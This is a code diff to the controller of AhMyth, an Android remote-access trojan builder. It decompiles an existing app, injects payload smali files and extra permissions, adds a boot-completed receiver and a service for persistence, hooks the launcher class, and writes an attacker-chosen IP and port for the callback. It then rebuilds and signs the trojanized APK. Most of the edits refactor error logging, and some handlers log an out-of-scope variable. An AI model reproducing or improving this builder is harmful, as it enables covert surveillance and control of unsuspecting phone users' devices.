@@ -234,7 +234,10 @@ app.controller("AppCtrl", ($scope) => {
       // Parse the XML data
       xml2js.parseString(data, (parseError, parsedData) => {
         if (parseError) {
-          throw parseError;
+          delayedLog('[x] Unable to Parse the Android Manifest Data!')
+          WriteErrorLog(parseError, 'Parsing');
+          delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
+          return;
         }
 
         // Remove existing permissions and features
@@ -276,9 +279,12 @@ app.controller("AppCtrl", ($scope) => {
         fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'),
           updatedData,
           'utf8',
-          (writeError) => {
-            if (writeError) {
-              throw writeError;
+          (error) => {
+            if (error) {
+              delayedLog('[x] Unable to Write the Selected Permissions to the Manifest!', CONSTANTS.logStatus.FAIL);
+              WriteErrorLog(parseError, 'Permissions');
+              delayedLog('[¡] Error written to "Permissions.log" on...', CONSTANTS.logStatus.INFO);
+              return;
             }
 
           });
@@ -301,54 +307,53 @@ app.controller("AppCtrl", ($scope) => {
 
     // Build the AhMyth Payload APK
     delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
+    var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
+    exec(createApk, (error, stdout, stderr) => {
+      if (error !== null) {
+        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
+        WriteErrorLog(error, 'Building');
+        delayedLog('[¡] Error written to "Building.log" on...', CONSTANTS.logStatus.INFO);
+        delayedLog(logPath, CONSTANTS.logStatus.INFO);
+        return;
+      }
 
-    var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"',
-      (error, stdout, stderr) => {
+      delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
+      var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
+      exec(signApk, (error, stdout, stderr) => {
         if (error !== null) {
-          delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
-          WriteErrorLog(error, 'Building');
-          delayedLog('[x] Building Error written to "Building.log" on...', CONSTANTS.logStatus.INFO);
+          delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
+          WriteErrorLog(error, 'Signing');
+          delayedLog('[¡] Error written to "Signing.log" on... ', CONSTANTS.logStatus.INFO);
           delayedLog(logPath, CONSTANTS.logStatus.INFO);
           return;
         }
 
-        delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
+        fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
+          if (err) throw err;
 
-        var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"',
-          (error, stdout, stderr) => {
-            if (error !== null) {
-              delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
-              WriteErrorLog(error, 'Signing');
-              delayedLog('[x] Signing Error written to "Signing.log" on... ', CONSTANTS.logStatus.INFO);
-              delayedLog(logPath, CONSTANTS.logStatus.INFO);
-              return;
-            }
+          delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
+          delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
+          delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
+          delayedLog();
 
-            fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
-              if (err) throw err;
-
-              delayedLog('[✓] Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-              delayedLog('[✓] The apk has been built on ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
-              delayedLog();
-
-              fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
-                if (err) throw err;
-              });
-            });
+          fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+            if (err) throw err;
           });
+        });
       });
+    });
   };
 
   // function to copy ahmyth source files to the orginal app
   // and if success go to generate the apk
   $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
-    delayedLog('[★] Reading the Original Decompiled APK...')
+    delayedLog('[★] Reading the Decompiled Original Application...')
     fs.readdir(apkFolder, {
       withFileTypes: true
     }, (error, files) => {
       if (error) {
-        delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
+        delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL)
         return;
       }
 
@@ -371,17 +376,16 @@ app.controller("AppCtrl", ($scope) => {
       smaliList.sort((a, b) => collator.compare(a, b));
       var lastSmali = smaliList[smaliList.length - 1];
       if (lastSmali == "smali") {
-        delayedLog('[★] Creating the new Smali Payload Directory...');
+        delayedLog('[★] Creating the Smali Payload Directory...');
         fs.mkdir(apkFolder + "/smali_classes2", {
           recursive: true
         }, error => {
           if (error) {
-            delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
+            delayedLog('[x] Failed to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
             return;
           };
 
-          delayedLog('[★] Copying AhMyth Payload Files to Original App...');
-
+          delayedLog('[★] Copying Payload Files to the Original Decompiled Application...');
           fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
             dir.join(apkFolder, "smali_classes2"), (error) => {
               if (error) {
@@ -411,8 +415,8 @@ app.controller("AppCtrl", ($scope) => {
         var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
         var newSmaliNumber = lastSmaliNumber + 1;
         var payloadSmaliFolder = ('/smali_classes' + newSmaliNumber);
-        delayedLog('[★] Creating the new Smali Payload Directory...')
 
+        delayedLog('[★] Creating the new Smali Payload Directory...')
         fs.mkdir(apkFolder + payloadSmaliFolder, {
           recursive: true
         }, error => {
@@ -421,8 +425,7 @@ app.controller("AppCtrl", ($scope) => {
             return;
           };
 
-          delayedLog('[★] Copying AhMyth Payload Files to Original App...');
-
+          delayedLog('[★] Copying Payload Files to the Decompiled Original App...');
           fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
             dir.join(apkFolder, payloadSmaliFolder), (error) => {
               if (error) {
@@ -516,7 +519,7 @@ app.controller("AppCtrl", ($scope) => {
       selectedPermissions = permissions;
     }
 
-    delayedLog('[★] Parsing the Android Manifest File...');
+    delayedLog('[★] Parsing the Android Manifest Data...');
 
     // Convert data to a string if it's not already a string
     if (typeof data !== 'string') {
@@ -527,8 +530,9 @@ app.controller("AppCtrl", ($scope) => {
       explicitArray: false
     }, (err, result) => {
       if (err) {
-        delayedLog(err);
-        callback(err);
+        callback('[¡] Failed to Parse the Android Manifest Data!', CONSTANTS.logStatus.FAIL);
+        WriteErrorLog(parseError, 'Parsing');
+        delayedLog('[¡] Error written to "Parsing.log" on...', CONSTANTS.logStatus.INFO);
         return;
       }
 
@@ -566,7 +570,7 @@ app.controller("AppCtrl", ($scope) => {
         return !existingPermissions.has(permission);
       });
 
-      delayedLog('[★] Modifying the Android Manifest File...');
+      delayedLog('[★] Injecting Payload Permissions...');
 
       // Add new permissions and features based on filteredPermissions
       filteredPermissions.forEach(permission => {
@@ -615,11 +619,10 @@ app.controller("AppCtrl", ($scope) => {
   $appCtrl.BindOnBoot = (apkFolder) => {
     const manifestPath = dir.join(apkFolder, 'AndroidManifest.xml');
 
-    delayedLog('[★] Reading the Android Manifest File...');
-    fs.readFile(manifestPath, 'utf8', (error,
-      data) => {
-      if (error) {
-        delayedLog(error);
+    delayedLog('[★] Reading the Android Manifest File...')
+    fs.readFile(manifestPath, 'utf8', (err, data) => {
+      if (err) {
+        delayedLog('[x] Unable to Read the Android Manifest File!', CONSTANTS.logStatus.FAIL);
         return;
       }
 
@@ -629,68 +632,77 @@ app.controller("AppCtrl", ($scope) => {
           return;
         }
 
-        xml2js.parseString(updatedData, {
+        const parser = new xml2js.Parser({
           explicitArray: false
-        }, (err, result) => {
-          if (err) {
-            delayedLog(err);
+        });
+
+        delayedLog('[★] Parsing the Modified Android Manifest Data...')
+        parser.parseString(updatedData, (parseErr, result) => {
+          if (parseErr) {
+            console.error('[x] Unable to Parse the Modified Android Manifest XML!', CONSTANTS.logStatus.FAIL);
             return;
           }
 
-          const parsedData = result;
+          // Use the service and receiver from Constants.js
           const receiver = CONSTANTS.ahmythReceiver;
           const service = CONSTANTS.ahmythService;
 
-          // Construct the receiver tag
+          delayedLog('[★] Injecting the AhMyth Service and Receiver...')
+          // Construct the receiver and service tag
           const receiverTag = {
-            receiver: {
-              $: {
-                'android:enabled': 'true',
-                'android:exported': 'true',
-                'android:name': receiver,
-              },
-              'intent-filter': {
-                action: {
-                  $: {
-                    'android:name': 'android.intent.action.BOOT_COMPLETED'
-                  }
-                }
-              },
-              _: '' // Add empty string as element text
-            }
-          };
-
-          // Construct the service tag
-          const serviceTag = {
-            service: {
-              $: {
-                'android:enabled': 'true',
-                'android:exported': 'false',
-                'android:name': service,
-              },
-              _: '' // Add empty string as element text
-            }
-          };
-
-          parsedData.manifest.application.receiver = receiverTag.receiver;
-          parsedData.manifest.application.service = serviceTag.service;
-
-          const builder = new xml2js.Builder({
-            renderOpts: {
-              pretty: true,
-              indent: '    '
+            $: {
+              'android:enabled': 'true',
+              'android:exported': 'true',
+              'android:name': receiver,
             },
-            headless: true
-          });
-          const updatedManifestData = builder.buildObject(parsedData);
+            'intent-filter': {
+              action: {
+                $: {
+                  'android:name': 'android.intent.action.BOOT_COMPLETED',
+                },
+              },
+            },
+          };
 
-          fs.writeFile(manifestPath, updatedManifestData, 'utf8', (error) => {
+          const serviceTag = {
+            $: {
+              'android:enabled': 'true',
+              'android:exported': 'false',
+              'android:name': service,
+            },
+          };
+
+          // Add the receiver and service tags to the application node
+          if (!result.manifest.application.receiver) {
+            result.manifest.application.receiver = [];
+          }
+
+          result.manifest.application.receiver.push(receiverTag);
+
+          if (!result.manifest.application.service) {
+            result.manifest.application.service = [];
+          }
+
+          result.manifest.application.service.push(serviceTag);
+
+          const builder = new xml2js.Builder();
+
+          // Modify the parsed object by finding and updating the closing application tag
+          const closingAppTag = '</application>';
+          const modifiedClosingAppTag = '\n  </application>';
+          const xmlString = builder.buildObject(result);
+
+          const modifiedXml = xmlString.replace(closingAppTag, modifiedClosingAppTag);
+
+          // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
+          const closingManifestTag = '</manifest>';
+          const finalModifiedXml = modifiedXml.replace(closingManifestTag, '</manifest>');
+
+          fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
             if (error) {
-              delayedLog(error);
+              delayedLog('[x] Unable to Write Modifications Back to the Manifest File!', CONSTANTS.logStatus.FAIL);
               return;
             }
-
-            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
           });
         });
       });
@@ -713,70 +725,78 @@ app.controller("AppCtrl", ($scope) => {
           return;
         }
 
-        xml2js.parseString(updatedData, {
+        const parser = new xml2js.Parser({
           explicitArray: false
-        }, (err, result) => {
-          if (err) {
-            delayedLog(err);
+        });
+
+        delayedLog('[★] Parsing the Modified Android Manifest Data...')
+        parser.parseString(updatedData, (parseErr, result) => {
+          if (parseErr) {
+            delayedLog('[x] Unable to Parse the Modified Android Manifest XML!');
             return;
           }
 
-          const parsedData = result;
+          delayedLog('[★] Injecting the AhMyth Service and Receiver...')
+          // Use the service and receiver from Constants.js
           const receiver = CONSTANTS.ahmythReceiver;
           const service = CONSTANTS.ahmythService;
 
-          // Construct the receiver tag
+          // Construct the receiver and service tag
           const receiverTag = {
-            receiver: {
-              $: {
-                'android:enabled': 'true',
-                'android:exported': 'true',
-                'android:name': receiver,
-              },
-              'intent-filter': {
-                action: {
-                  $: {
-                    'android:name': 'android.intent.action.BOOT_COMPLETED',
-                  },
+            $: {
+              'android:enabled': 'true',
+              'android:exported': 'true',
+              'android:name': receiver,
+            },
+            'intent-filter': {
+              action: {
+                $: {
+                  'android:name': 'android.intent.action.BOOT_COMPLETED',
                 },
               },
-              _: '',
-              // Add empty string as element text
             },
           };
 
-          // Construct the service tag
           const serviceTag = {
-            service: {
-              $: {
-                'android:enabled': 'true',
-                'android:exported': 'false',
-                'android:name': service,
-              },
-              _: '',
-              // Add empty string as element text
+            $: {
+              'android:enabled': 'true',
+              'android:exported': 'false',
+              'android:name': service,
             },
           };
 
-          parsedData.manifest.application.receiver = receiverTag.receiver;
-          parsedData.manifest.application.service = serviceTag.service;
+          // Add the receiver and service tags to the application node
+          if (!result.manifest.application.receiver) {
+            result.manifest.application.receiver = [];
+          }
 
-          const builder = new xml2js.Builder({
-            renderOpts: {
-              pretty: true,
-              indent: '    ',
-            },
-            headless: true,
-          });
-          const updatedManifestData = builder.buildObject(parsedData);
+          result.manifest.application.receiver.push(receiverTag);
 
-          fs.writeFile(manifestPath, updatedManifestData, 'utf8', (error) => {
+          if (!result.manifest.application.service) {
+            result.manifest.application.service = [];
+          }
+
+          result.manifest.application.service.push(serviceTag);
+
+          const builder = new xml2js.Builder();
+
+          // Modify the parsed object by finding and updating the closing application tag
+          const closingAppTag = '</application>';
+          const modifiedClosingAppTag = '\n  </application>';
+          const xmlString = builder.buildObject(result);
+
+          const modifiedXml = xmlString.replace(closingAppTag, modifiedClosingAppTag);
+
+          // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
+          const closingManifestTag = '</manifest>';
+          const finalModifiedXml = modifiedXml.replace(closingManifestTag, '</manifest>');
+
+          fs.writeFile(manifestPath, finalModifiedXml, 'utf8', (error) => {
             if (error) {
               delayedLog(error);
               return;
             }
 
-            delayedLog('[★] Searching for a Hookable Main Class in the Android Manifest...');
             fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {
               if (error) {
                 delayedLog('[x] Reading the Manifest File Failed!');
@@ -911,27 +931,27 @@ app.controller("AppCtrl", ($scope) => {
     }*/
 
     var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
-    delayedLog('[★] ' + 'Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
+    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
     fs.readFile(ipPortFile, 'utf8', (error, data) => {
       if (error) {
-        $appCtrl.Log('[x] ' + 'Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
+        delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
         WriteErrorLog(error, 'IP:PORT')
-        $appCtrl.Log('[¡] ' + 'Error Written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
-        $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+        delayedLog('[¡] Error Written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+        delayedLog(logPath, CONSTANTS.logStatus.INFO);
         return;
       }
 
       // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
       var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
-      delayedLog('[★] ' + 'Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');
+      delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');
 
       var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
       fs.writeFile(ipPortFile, result, 'utf8', (error) => {
         if (error) {
-          $appCtrl.Log('[x] ' + 'Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
+          delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
           WriteErrorLog(error, 'IP:PORT')
-          $appCtrl.Log('[¡] ' + 'Error Written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
-          $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+          delayedLog('[¡] Error Written to "IP-PORT.log" on...', CONSTANTS.logStatus.INFO)
+          delayedLog(logPath, CONSTANTS.logStatus.INFO);
           return;
         }
 
@@ -956,10 +976,10 @@ app.controller("AppCtrl", ($scope) => {
           var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
             (error, stdout, stderr) => {
               if (error !== null) {
-                $appCtrl.Log('[x] ' + 'Decompiling Failed!', CONSTANTS.logStatus.FAIL);
+                delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                 WriteErrorLog(error, 'Decompiling')
-                $appCtrl.Log('[¡] ' + 'Error Written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
-                $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
+                delayedLog('[¡] Error Written to "Decompiling.log" on...', CONSTANTS.logStatus.INFO)
+                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                 return;
               }
 
@@ -994,6 +1014,10 @@ function WriteErrorLog(errorMessage, errorType) {
 
   // Write the error to the appropriate log file based on the error type
   switch (errorType) {
+    case 'Permissions':
+      fs.appendFileSync(dir.join(logPath, 'Permissions.log'), errorMessage + '\n');
+      break;
+
     case 'Building':
       fs.appendFileSync(dir.join(logPath, 'Building.log'), errorMessage + '\n');
       break;
@@ -1014,6 +1038,10 @@ function WriteErrorLog(errorMessage, errorType) {
       fs.appendFileSync(dir.join(logPath, 'Copying.log'), errorMessage + '\n');
       break;
 
+    case 'Parsing':
+      fs.appendFileSync(dir.join(logPath, 'Parsing.log'), errorMessage + '\n');
+      break;
+
     default:
       // If the error type is not recognized, write it to a generic error log file
       fs.appendFileSync(dir.join(logPath, 'Error.log'), errorMessage + '\n');
@@ -1022,6 +1050,8 @@ function WriteErrorLog(errorMessage, errorType) {
 }
 
 function GetLauncherActivity(manifest) {
+
+  delayedLog('[★] Searching for a Hookable Class in the Modified Android Manifest Data...');
 
   const application = manifest['manifest']['application'][0];
 
@@ -1106,7 +1136,7 @@ function GetLauncherPath(launcherActivity, apkFolder, callback) {
       () => {
         if (!found) {
           callback('[x] Unable to Locate the Hookable Main Class File!');
-          callback('[x] Please Use the "On Boot" Method!\n');
+          callback('[x] Please Use the "On Boot" Method!');
         } else {
           callback(null, launcherPath);
         }
